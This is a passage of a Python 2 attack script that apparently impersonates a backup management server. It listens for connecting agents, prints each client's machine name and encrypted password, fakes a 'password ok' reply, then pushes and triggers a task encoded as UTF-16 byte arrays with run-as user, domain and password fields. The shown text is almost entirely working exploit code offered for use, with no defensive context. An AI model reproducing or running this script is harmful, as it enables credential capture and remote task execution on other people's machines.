0x22, 0x00, 0x2c, 0x00, 0x49, 0x00, 0x6d, 0x00, 
0x70, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 
0x6f, 0x00, 0x6e, 0x00, 0x61, 0x00, 0x74, 0x00, 
0x65, 0x00, 0x3d, 0x00, 0x66, 0x00, 0x61, 0x00, 
0x6c, 0x00, 0x73, 0x00, 0x65, 0x00, 0x2c, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x41, 0x00, 0x62, 0x00, 
0x6f, 0x00, 0x72, 0x00, 0x74, 0x00, 0x20, 0x00, 
0x69, 0x00, 0x66, 0x00, 0x20, 0x00, 0x69, 0x00, 
0x6d, 0x00, 0x70, 0x00, 0x65, 0x00, 0x72, 0x00, 
0x73, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x61, 0x00, 
0x74, 0x00, 0x69, 0x00, 0x6f, 0x00, 0x6e, 0x00, 
0x20, 0x00, 0x66, 0x00, 0x61, 0x00, 0x69, 0x00, 
0x6c, 0x00, 0x73, 0x00, 0x3d, 0x00, 0x66, 0x00, 
0x61, 0x00, 0x6c, 0x00, 0x73, 0x00, 0x65, 0x00, 
0x22, 0x00, 0x22, 0x00,
0x2c, 0x00, 0x22, 0x00, 0x22, 0x00, 0x52, 0x00, 
0x75, 0x00, 0x6e, 0x00, 0x20, 0x00, 0x61, 0x00, 
0x73, 0x00, 0x20, 0x00, 0x55, 0x00, 0x73, 0x00, 
0x65, 0x00, 0x72, 0x00, 0x20, 0x00, 0x6e, 0x00, 
0x61, 0x00, 0x6d, 0x00, 0x65, 0x00, 0x3d, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6e, 0x00, 
0x20, 0x00, 0x61, 0x00, 0x73, 0x00, 0x20, 0x00, 
0x44, 0x00, 0x6f, 0x00, 0x6d, 0x00, 0x61, 0x00, 
0x69, 0x00, 0x6e, 0x00, 0x3d, 0x00, 0x2e, 0x00, 
0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x22, 0x00, 
0x22, 0x00, 0x52, 0x00, 0x75, 0x00, 0x6e, 0x00, 
0x20, 0x00, 0x61, 0x00, 0x73, 0x00, 0x20, 0x00, 
0x50, 0x00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00, 
0x77, 0x00, 0x6f, 0x00, 0x72, 0x00, 0x64, 0x00, 
0x3d, 0x00, 0x59, 0x00, 0x77, 0x00, 0x42, 0x00, 
0x69, 0x00, 0x41, 0x00, 0x47, 0x00, 0x51, 0x00, 
0x41, 0x00, 0x66, 0x00, 0x41, 0x00, 0x42, 0x00, 
0x36, 0x00, 0x41, 0x00, 0x48, 0x00, 0x77, 0x00, 
0x41, 0x00, 0x5a, 0x00, 0x51, 0x00, 0x42, 0x00, 
0x69, 0x00, 0x41, 0x00, 0x47, 0x00, 0x51, 0x00, 
0x41, 0x00, 0x63, 0x00, 0x67, 0x00, 0x41, 0x00, 
0x34, 0x00, 0x41, 0x00, 0x48, 0x00, 0x51, 0x00, 
0x41, 0x00, 0x45, 0x00, 0x77, 0x00, 0x41, 0x00, 
0x44, 0x00, 0x41, 0x00, 0x41, 0x00, 0x77, 0x00, 
0x41, 0x00, 0x63, 0x00, 0x77, 0x00, 0x42, 0x00, 
0x6d, 0x00, 0x41, 0x00, 0x48, 0x00, 0x55, 0x00, 
0x41, 0x00, 0x61, 0x00, 0x41, 0x00, 0x41, 0x00, 
0x64, 0x00, 0x41, 0x00, 0x41, 0x00, 0x45, 0x00, 
0x41, 0x00, 0x63, 0x00, 0x67, 0x00, 0x42, 0x00, 
0x68, 0x00, 0x41, 0x00, 0x48, 0x00, 0x49, 0x00, 
0x41, 0x00, 0x61, 0x00, 0x51, 0x00, 0x41, 0x00, 
0x45, 0x00, 0x41, 0x00, 0x41, 0x00, 0x38, 0x00, 
0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x42, 0x00, 
0x34, 0x00, 0x41, 0x00, 0x42, 0x00, 0x30, 0x00, 
0x41, 0x00, 0x62, 0x00, 0x77, 0x00, 0x41, 0x00, 
0x4a, 0x00, 0x41, 0x00, 0x47, 0x00, 0x41, 0x00, 
0x41, 0x00, 0x64, 0x00, 0x77, 0x00, 0x42, 0x00, 
0x6a, 0x00, 0x41, 0x00, 0x43, 0x00, 0x77, 0x00, 
0x41, 0x00, 0x44, 0x00, 0x41, 0x00, 0x41, 0x00, 
0x42, 0x00, 0x41, 0x00, 0x48, 0x00, 0x34, 0x00, 
0x41, 0x00, 0x47, 0x00, 0x77, 0x00, 0x42, 0x00, 
0x70, 0x00, 0x41, 0x00, 0x41, 0x00, 0x73, 0x00, 
0x41, 0x00, 0x65, 0x00, 0x67, 0x00, 0x42, 0x00, 
0x31, 0x00, 0x41, 0x00, 0x47, 0x00, 0x41, 0x00, 
0x41, 0x00, 0x61, 0x00, 0x41, 0x00, 0x41, 0x00, 
0x4d, 0x00, 0x41, 0x00, 0x44, 0x00, 0x59, 0x00, 
0x41, 0x00, 0x5a, 0x00, 0x77, 0x00, 0x41, 0x00, 
0x69, 0x00, 0x41, 0x00, 0x41, 0x00, 0x3d, 0x00, 
0x3d, 0x00, 0x22, 0x00, 0x22, 0x00, 0x2c, 0x00, 
0x2f, 0x00, 0x2f, 0x00, 0x31, 0x00, 0x31, 0x00, 
0x7d, 0x00, 0x22, 0x00, 0x2c, 0x00, 0x0d, 0x00, 
0x0a, 0x00 ]

execute_template = [
0x42, 0x00, 0x41, 0x00, 0x43, 0x00, 0x4b, 0x00, 
0x55, 0x00, 0x50, 0x00, 0x5f, 0x00, 0x53, 0x00, 
0x45, 0x00, 0x4c, 0x00, 0x45, 0x00, 0x43, 0x00, 
0x54, 0x00, 0x45, 0x00, 0x44, 0x00, 0x2c, 0x00, 
0x7b, 0x00, 0x45, 0x00, 0x37, 0x00, 0x45, 0x00, 
0x43, 0x00, 0x46, 0x00, 0x34, 0x00, 0x32, 0x00, 
0x44, 0x00, 0x2d, 0x00, 0x37, 0x00, 0x38, 0x00, 
0x45, 0x00, 0x34, 0x00, 0x2d, 0x00, 0x34, 0x00, 
0x32, 0x00, 0x34, 0x00, 0x38, 0x00, 0x2d, 0x00, 
0x42, 0x00, 0x37, 0x00, 0x45, 0x00, 0x45, 0x00, 
0x2d, 0x00, 0x33, 0x00, 0x38, 0x00, 0x39, 0x00, 
0x35, 0x00, 0x33, 0x00, 0x36, 0x00, 0x44, 0x00, 
0x38, 0x00, 0x42, 0x00, 0x44, 0x00, 0x33, 0x00, 
0x38, 0x00, 0x7d, 0x00, 0x2c, 0x00, 0x66, 0x00, 
0x61, 0x00, 0x6c, 0x00, 0x73, 0x00, 0x65, 0x00, 
0x0d, 0x00, 0x0a, 0x00]


#### I know, I know, just wanted to try it fast don't hate me because this shit
create_task = ""
for x in task_template:
	create_task = create_task + chr(x)

execute_task = ""
for x in execute_template:
	execute_task = execute_task + chr(x)

###### Client handler
def clients(conn):
	data = conn.recv(1024).split(",")
	print " -> Machine: " + data[2]
	print " -> Encrypted Password:\n" + data[1]
	conn.send(password_ok.decode("hex"))

	ping = conn.recv(1024)
	print "[+] Creating new task..."
	conn.send(create_task)
	ack = conn.recv(1024).split(",")
	print "[+] " + ack[0]
	conn.send(iddle.decode("hex"))
	ping = conn.recv(1024)
	print "[+] Executing task..."
	conn.send(execute_task)
	ack = conn.recv(1024).split(",")
	print "[+] Is it OK? " + ack[0]
	conn.close()


####### Main 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	sock.bind((host, port))
except socket.error as msg:
	print "Error: " + str(msg) + " - " + msg[1]
	sys.exit(1)
sock.listen(10)

while 1:
	conn, addr = sock.accept()
	print "[+] New client connected from " + addr[0]
	start_new_thread(clients, (conn,))
sock.close()
